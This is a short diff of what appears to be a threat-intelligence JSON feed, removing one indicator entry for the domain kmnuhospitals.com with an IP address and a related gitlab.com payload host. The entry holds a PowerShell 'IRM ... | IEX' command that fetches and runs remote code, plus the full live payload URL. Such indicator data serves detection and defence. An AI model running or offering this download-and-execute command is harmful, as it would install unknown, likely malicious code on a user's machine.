@@ -2452,25 +2452,5 @@
     "ResolvedDownloadUrl": [],
     "ReportId": "cmww5jriw0g6q0nml8w3skc6t",
     "ScannedAt": "2026-11-25T13:21:22.502000+00:00"
-  },
-  {
-    "UrlDomain": "kmnuhospitals.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "194.164.149.65"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
-    ],
-    "ReportId": "cmwvxf3vm0g3x0nmlspmepj55",
-    "ScannedAt": "2026-11-25T09:33:48.278000+00:00"
   }
 ]
